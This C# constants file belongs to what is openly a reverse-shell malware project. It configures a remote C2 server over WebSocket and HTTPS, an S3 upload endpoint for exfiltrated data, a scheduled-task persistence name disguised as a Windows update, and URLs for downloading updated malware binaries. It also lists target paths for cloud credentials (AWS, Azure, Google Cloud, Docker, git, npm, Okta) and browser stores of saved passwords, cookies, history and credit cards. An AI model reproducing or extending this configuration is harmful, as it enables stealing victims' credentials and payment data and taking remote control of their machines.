﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WebSocketReverseShellDotNet.utils
{
    internal static class Constants
    {
/*        public const String SERVER_WEBSOCKET_URI = "ws://127.0.0.1:8070/reverseShellClients";
        public const String SERVER_HTTP_URI = "http://127.0.0.1:8070";*/

        public const String SERVER_WEBSOCKET_URI = "wss://c2-server.mtattab.com/reverseShellClients";
        public const String SERVER_HTTP_URI = "https://c2-server.mtattab.com";



        public const String S3_API_ENDPOINT = "/v1/api/s3";

        public const String S3_API_UPLOAD = "/upload";


        public const String S3_API_UPLOAD_SESSION_PARAM = "?sessionId=";


        public const String PERSISTENCE_WINDOWS_TASK = "Update-Windows-System-Task";
        /*        schtasks /delete /tn "Update-Windows-System-Task" /f */
        public const String LOCK_FILE_NAME = "9380378181806-lock";

        public const String JFROG_BASE_URL= "https://mhattab.jfrog.io/artifactory/libs-release-local/com/mtattab/reverseshell/reverseShell/";
        public const String UPDATED_MALWARE_URL= "https://c2-binaries.s3.us-east-2.amazonaws.com/reverseShell-1.0.1-zip.zip";

        public const String JFROG_META_DATA_FILE= "maven-metadata.xml";


        public const String JFROG_LATEST_AGENT_PATH= "%s/reverseShell-%s-zip.zip";

        public const String JFROG_LATEST_REGEX= "<latest>(.*?)<\\/latest>";

        public const String EXFILTRATE_FOLDER = ".exfiltrate";
        public const String NEW_AGENT_DIRECTORY= ".agent";
        public const String CUSTOM_SCRIPT_DIRECTORY = ".scripts";

        public const String PASSWORD_HIJACKER = "password-hijaker.exe";
        public const String RICK_ROLL = "WebSocketReverseShellDotNet.rick-roll-bass-boosted.mp3";

        public static string[] LIST_OF_CRED_LOCATIONS = [
            "%USERPROFILE%\\.azure\\azureProfile.json",
            "%USERPROFILE%\\.azure\\accessTokens.json",
            "%USERPROFILE%\\.docker\\config.json",
            "%APPDATA%\\gh\\config.yml",
            "%UserProfile%\\.aws\\credentials",
            "%UserProfile%\\.aws\\config",
            "%UserProfile%\\.okta\\okta.yaml",
            "%USERPROFILE%\\.netrc",
            "%USERPROFILE%\\.git-credentials",
            "%USERPROFILE%\\.npmrc",
            "%APPDATA%\\gcloud\\credentials.db",
            "%APPDATA%\\gcloud\\application_default_credentials.json",
            "%USERPROFILE%\\.oci\\config",
            "%GOOGLE_APPLICATION_CREDENTIALS%",
        ];

        public static string[] LIST_OF_BROWSER_LOCATIONS = [
            "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\",
            "%LOCALAPPDATA%\\Google\\Chrome SxS\\User Data\\",
            "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\",
            "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\",
            "%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\",
        ];

        public static string ENCRYPTION_KEY_BROWSER_DB = "Local State";

        public static string[] LIST_OF_PROFILE_LOCATIONS = [
            "Default\\",
            "Profile 1\\",
            "Profile 2\\",
            "Profile 3\\",
            "Profile 4\\",
            "Profile 5\\",
            "Profile 6\\",
        ];
        public static string LOGIN_DATA_BROWSER_DB = "Login Data";
        public static string COOKIES_BROWSER_DB = "Network\\Cookies";
        public static string HISTORY_BROWSER_DB = "History";
        public static string CREDIT_CARDS_BROWSER_DB = "Web Data";






    }
}
